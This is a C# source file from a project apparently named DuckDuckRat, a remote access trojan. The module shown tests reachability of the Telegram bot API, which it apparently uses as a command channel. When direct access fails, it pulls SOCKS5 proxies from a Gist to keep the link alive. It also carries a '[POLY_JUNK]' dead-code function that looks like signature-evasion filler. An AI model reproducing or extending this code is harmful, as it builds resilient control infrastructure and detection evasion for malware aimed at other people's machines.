using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Diagnostics;
using DuckDuckRat;

namespace DuckDuckRat.Modules
{
    public static class ProxyTunnel
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_bc8cae3f() {
            int val = 56824;
            if (val > 50000) Console.WriteLine("Hash:" + 56824);
        }

        private static string _currentProxy = null;

        public static async Task<HttpClient> GetBestHttpClient()
        {
            DuckDuckRat.Logger.Info("[PROXY] Connectivity check (China Bypass)...");
            // 1. Try direct connection
            if (await TestTelegramConnectivity(null))
            {
                DuckDuckRat.Logger.Info("[PROXY] Direct connection OK.");
                return new HttpClient();
            }

            // 2. Try proxy from Gist
            DuckDuckRat.Logger.Warn("[PROXY] Direct connection failed. Fetching proxy from Gist...");
            string gistProxy = await GistManager.GetFileContent("proxies.json");
            
            if (!string.IsNullOrEmpty(gistProxy))
            {
                // Ensure protocol prefix
                if (!gistProxy.Contains("://")) gistProxy = "socks5://" + gistProxy;
                
                DuckDuckRat.Logger.Info($"[PROXY] Testing Gist Proxy: {gistProxy}");
                if (await TestTelegramConnectivity(gistProxy))
                {
                    DuckDuckRat.Logger.Info("[PROXY] Gist Proxy is WORKING.");
                    _currentProxy = gistProxy;
                    return CreateProxiedClient(gistProxy);
                }
            }

            DuckDuckRat.Logger.Error("[PROXY] All connectivity attempts failed.");
            return new HttpClient();
        }

        private static async Task<bool> TestTelegramConnectivity(string proxyUrl)
        {
            try
            {
                using (var client = string.IsNullOrEmpty(proxyUrl) ? new HttpClient() : CreateProxiedClient(proxyUrl))
                {
                    client.Timeout = TimeSpan.FromSeconds(5);
                    // Minimal request to TG API
                    var response = await client.GetAsync("https://api.telegram.org/bot7265936412:AAH-NOT-A-REAL-TOKEN-JUST-PING/getMe");
                    // 401 Unauthorized is OK, it means we reached the server
                    return response.StatusCode == HttpStatusCode.Unauthorized || response.IsSuccessStatusCode;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[PROXY] Test failed for {proxyUrl ?? "DIRECT"}: {ex.Message}");
                return false;
            }
        }

        private static HttpClient CreateProxiedClient(string proxyUrl)
        {
            var handler = new HttpClientHandler
            {
                Proxy = new WebProxy(proxyUrl),
                UseProxy = true
            };
            return new HttpClient(handler);
        }
    }
}


